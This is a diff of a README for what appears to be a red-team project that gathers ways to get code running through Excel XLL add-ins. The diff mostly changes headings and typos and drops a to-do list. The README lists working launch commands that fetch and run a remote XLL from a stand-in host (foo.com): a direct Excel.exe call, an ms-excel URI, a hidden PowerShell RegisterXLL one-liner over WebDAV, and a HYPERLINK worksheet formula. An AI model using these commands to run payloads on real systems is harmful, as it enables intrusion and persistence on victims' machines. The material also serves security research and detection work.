@@ -10,7 +10,7 @@ A small project that aggregates community knowledge for Excel XLL execution, via
 - MWR Labs: https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/
 - @SubTee
 
-### Getting Execution
+### Getting Exec
 Put your code in either,
 ```
 dllmain.cpp
@@ -19,6 +19,7 @@ PROCESS_ATTACH
 XLL_POC.cpp
 xlAutoOpen()
 ```
+#### Some various execution techniques 
 Excel
 ```
 Excel.exe http://foo.com/xll.xll
@@ -27,16 +28,12 @@ uri
 ```
 ms-excel:ofe|u|http://foo.com/xll.xll
 ```
-Everyone favourite oneliner
+Everyones favourite oneliner 
 ```
 powershell -w hidden -c "IEX ((new-object -ComObject excel.application).RegisterXLL('\\webdavxll_poc.xll')"
 ```
-Embedded in the Worksheet
+Embedded in the Worksheet (xll cant be found)
 ```
 =HYPERLINK("http://foo.com/xll.xll", "CLICK")
 ```
 
-### To-Do
-
-- Add x64 support
-- ...
